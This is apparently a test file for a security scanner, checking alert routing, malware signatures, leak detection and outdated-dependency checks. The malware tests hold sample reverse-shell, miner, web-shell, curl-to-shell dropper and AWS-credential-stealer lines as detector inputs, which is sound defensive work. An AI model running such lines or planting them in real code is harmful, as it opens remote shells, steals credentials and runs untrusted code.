import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, writeFileSync, mkdirSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { execFileSync } from "node:child_process";
import { AutoScanner, categorise } from "../src/autoscan.ts";
import { scanText, scanMalware, scanFile, EICAR_SHA256 } from "../src/detectors/malware.ts";
import { findCards, luhn, leaksInText, scanLeaks } from "../src/detectors/leak.ts";
import { judgePackage, runtimeFindings, osFinding, nodeStatus } from "../src/detectors/outdated.ts";
import { refsFor } from "../src/frameworks.ts";

const EICAR = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
const alert = (rule: string, severity: "low" | "medium" | "high" | "critical" = "high", id = rule) => ({ rule, title: rule, severity, id });

test("auto-scan: every alert family maps to the right follow-up scans", () => {
  assert.deepEqual(categorise("ID-SPRAY"), ["intrusion"]);
  assert.deepEqual(categorise("MAL-DROPPER"), ["malware"]);
  assert.deepEqual(categorise("RANSOM-MASS-ENCRYPTION"), ["malware"]);
  assert.deepEqual(categorise("LEAK-CARD-NUMBER"), ["leak"]);
  assert.deepEqual(categorise("NET-WEBHOOK-EXFIL").sort(), ["intrusion", "leak"]);
  assert.deepEqual(categorise("SYS-VULN-DEPENDENCY"), ["vulnerability"]);
  assert.deepEqual(categorise("OLD-MAJOR-BEHIND"), ["vulnerability"]);
  assert.deepEqual(categorise("WEB-NO-CSP"), [], "a missing header is not a reason to start scans");
});

test("auto-scan: an intrusion starts its follow-ups once; repeats inside the cooldown do not", () => {
  const t0 = Date.parse("2026-11-22T10:00:00Z");
  const a = new AutoScanner({ startedAt: t0 - 60_000, graceMs: 0 });
  a.consider(alert("ID-LOG-TAMPER", "critical"), t0);
  const r1 = a.flush(() => false, t0)!;
  assert.deepEqual(r1.kinds, ["cloud", "system", "secrets", "malware", "leak"]);
  // a scan raises a finding of the same family a minute later: cooldown holds
  a.consider(alert("ID-PERSISTENCE", "high"), t0 + 60_000, "cloud");
  assert.equal(a.flush(() => false, t0 + 60_000), null);
  // after the cooldown it runs again
  a.consider(alert("ID-PERSISTENCE", "high", "x2"), t0 + 11 * 60_000, "cloud");
  assert.ok(a.flush(() => false, t0 + 11 * 60_000)!.kinds.includes("system"));
});

test("auto-scan: a scan never re-triggers itself; low severity and handled alerts start nothing", () => {
  const t0 = Date.parse("2026-11-22T10:00:00Z");
  const a = new AutoScanner({ startedAt: t0 - 60_000, graceMs: 0, cooldownMs: 0 });
  a.ran("malware", t0 - 1000);
  a.consider(alert("MAL-MINER", "high"), t0, "malware");
  assert.ok(!(a.flush(() => false, t0)?.kinds ?? []).includes("malware"));
  assert.equal(a.consider(alert("LEAK-TEST-CARD", "low"), t0).length, 0);
  assert.equal(a.consider(alert("SYS-VULN-DEPENDENCY", "medium"), t0).length, 0, "vulnerabilities need high or worse");
  assert.equal(a.consider({ ...alert("ID-SPRAY", "critical"), acknowledged: { by: "x", at: "" } }, t0).length, 0);
});

test("auto-scan: live evidence after a scan re-runs it (after a short gap), not after the cooldown", () => {
  const t0 = Date.parse("2026-11-22T10:00:00Z");
  const a = new AutoScanner({ startedAt: t0 - 60_000, graceMs: 0, minGapMs: 20_000 });
  a.ran("leak", t0 - 5_000);
  a.consider(alert("LEAK-CARD-NUMBER", "critical"), t0);
  const r = a.flush(() => false, t0)!;
  assert.ok(!r.kinds.includes("leak") && r.skipped.some((s) => s.kind === "leak" && /runs again/.test(s.why)));
  const d = a.retryDelay(t0)!; assert.ok(d > 14_000 && d < 16_000);
  assert.deepEqual(a.flush(() => false, t0 + d)!.kinds, ["leak"]);
});

test("auto-scan: scheduled re-checks come due, and nothing runs while switched off", () => {
  const t0 = Date.parse("2026-11-22T10:00:00Z");
  const a = new AutoScanner({ startedAt: t0, graceMs: 0 });
  for (const k of ["deps", "outdated", "supply", "secrets", "malware", "leak"]) a.ran(k, t0);
  assert.equal(a.due(() => false, t0 + 3_600_000), null);
  assert.deepEqual(a.due(() => false, t0 + 6 * 3_600_000)!.kinds.sort(), ["leak", "malware"]);
  a.enabled = false;
  assert.equal(a.consider(alert("ID-SPRAY", "critical"), t0).length, 0);
  assert.equal(a.due(() => false, t0 + 48 * 3_600_000), null);
});

test("malware: signatures catch shells, miners, web shells, droppers, stealers and obfuscation; normal code is clean", () => {
  const ids = (t: string, k: "code" | "data" | "install-script" = "code") => scanText(t, "x", k).map((h) => h.sig.id);
  assert.deepEqual(ids("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"), ["REVERSE-SHELL"]);
  assert.deepEqual(ids("./xmrig -o stratum+tcp://pool.example:3333"), ["MINER"]);
  assert.deepEqual(ids("<?php system($_GET['c']); ?>"), ["WEBSHELL"]);
  assert.deepEqual(ids("curl -fsSL https://x.example/i.sh | bash", "install-script"), ["DROPPER"]);
  assert.deepEqual(ids("const k = readFileSync(home + '/.aws/credentials'); await fetch('https://webhook.site/abc', { method: 'POST', body: k });"), ["CREDENTIAL-STEALER"]);
  assert.deepEqual(ids(`eval(atob("${"QUJD".repeat(20)}"))`), ["OBFUSCATED-EXEC"]);
  assert.deepEqual(ids("const r = await fetch(url); const total = items.reduce((a, b) => a + b.amount, 0);"), []);
  assert.deepEqual(ids("curl -o rates.csv https://rates.example/today.csv"), [], "a download that is not piped into a shell is fine");
});

test("malware: EICAR, a program disguised as a document and a malicious install script are found; keys merge scan and on-access", async () => {
  const dir = mkdtempSync(join(tmpdir(), "mal-"));
  const data = join(dir, "exports"), code = join(dir, "app");
  mkdirSync(data); mkdirSync(join(code, "node_modules", "evil-pkg"), { recursive: true });
  writeFileSync(join(data, "invoice.csv"), EICAR);
  writeFileSync(join(data, "statement.pdf.csv"), Buffer.from([0x4d, 0x5a, 0x90, 0, 3]));
  writeFileSync(join(code, "index.js"), "console.log('ok')\n");
  writeFileSync(join(code, "node_modules", "evil-pkg", "package.json"), JSON.stringify({ name: "evil-pkg", version: "1.0.0", scripts: { postinstall: "curl -s https://x.example/p.sh | sh" } }));
  const r = await scanMalware({ codeDirs: [code], dataDirs: [data] });
  assert.deepEqual(r.findings.map((f) => f.rule).sort(), ["MAL-DROPPER", "MAL-EICAR", "MAL-HIDDEN-EXECUTABLE"]);
  assert.equal(r.findings.find((f) => f.rule === "MAL-DROPPER")!.severity, "critical", "install scripts run by themselves");
  const one = scanFile(join(data, "invoice.csv"), "exports/invoice.csv", "data", new Set([EICAR_SHA256]));
  assert.equal(one.findings[0].key, r.findings.find((f) => f.rule === "MAL-EICAR")!.key, "the on-access alert and the scan alert are one alert");
  assert.ok(refsFor("MAL-DROPPER").includes("T1105"));
});

test("data leaks: card numbers by Luhn and brand, test cards told apart, secrets and bulk PII in logs", async () => {
  assert.ok(luhn("4532015112830366") && !luhn("4532015112830367"));
  assert.deepEqual(findCards("order 1234567890123, ref 4532-0151-1283-0366, test 4242 4242 4242 4242").map((c) => [c.last4, c.test]), [["0366", false], ["4242", true]]);
  const f = leaksInText(`{"card":"4532015112830366","key":"AKIAQWERTYUIOPASDFGH"}`, "runs/r1.jsonl", "runs");
  assert.deepEqual(f.map((x) => [x.rule, x.severity]), [["LEAK-CARD-NUMBER", "critical"], ["LEAK-SECRET-IN-LOGS", "critical"]]);
  assert.ok(!JSON.stringify(f).includes("4532015112830366"), "the full number never appears in an alert");
  const pii = Array.from({ length: 30 }, (_, i) => `customer${i}@acme-mail.com`).join(" ");
  assert.equal(leaksInText(pii, "logs/app.log", "logs")[0].rule, "LEAK-BULK-PII");
  const repo = mkdtempSync(join(tmpdir(), "leakrepo-"));
  execFileSync("git", ["init", "-q"], { cwd: repo });
  writeFileSync(join(repo, ".env"), "X=1\n"); writeFileSync(join(repo, ".env.example"), "X=\n"); writeFileSync(join(repo, "a.js"), "1");
  execFileSync("git", ["add", "."], { cwd: repo });
  const r = await scanLeaks([], [repo]);
  assert.deepEqual(r.findings.map((x) => [x.rule, x.where?.endsWith("/.env")]), [["LEAK-SENSITIVE-FILE-TRACKED", true]]);
});

test("outdated: deprecated, far-behind and abandoned packages; end-of-life runtimes, images, Lambda and OS", () => {
  const now = new Date("2026-11-22T00:00:00Z");
  const f = judgePackage("request", "2.88.2", { latest: "2.88.2", deprecated: { "2.88.2": "request has been deprecated" }, time: { "2.88.2": "2020-02-11T00:00:00Z" } }, "app", now);
  assert.deepEqual(f.map((x) => x.rule), ["OLD-DEPRECATED", "OLD-UNMAINTAINED"]);
  assert.deepEqual(judgePackage("nodemailer", "6.10.1", { latest: "10.6.1", time: { "10.6.1": "2026-10-01T00:00:00Z" } }, "app", now).map((x) => [x.rule, x.severity]), [["OLD-MAJOR-BEHIND", "high"]]);
  assert.deepEqual(judgePackage("zod", "4.1.0", { latest: "4.2.0", time: { "4.2.0": "2026-10-01T00:00:00Z" } }, "app", now), []);
  assert.equal(nodeStatus(20, now).eol, true, "Node 20 reached end of life on 2026-04-30");
  assert.equal(nodeStatus(22, now).eol, false);
  assert.deepEqual(runtimeFindings("FROM node:18-alpine\n", "Dockerfile", now).map((x) => x.rule), ["OLD-BASE-IMAGE"]);
  assert.deepEqual(runtimeFindings("runtime: lambda.Runtime.NODEJS_20_X, other: 'python3.8'", "infra.ts", now).map((x) => x.rule), ["OLD-CLOUD-RUNTIME", "OLD-CLOUD-RUNTIME"]);
  assert.equal(runtimeFindings("runtime: lambda.Runtime.NODEJS_22_X", "infra.ts", now).length, 0);
  assert.equal(osFinding('ID=ubuntu\nVERSION_ID="20.04"\nPRETTY_NAME="Ubuntu 20.04.6 LTS"', now).finding?.rule, "OLD-OS-EOL");
  assert.match(osFinding('ID=ubuntu\nVERSION_ID="24.04"', now).pass!, /supported until 2029/);
});
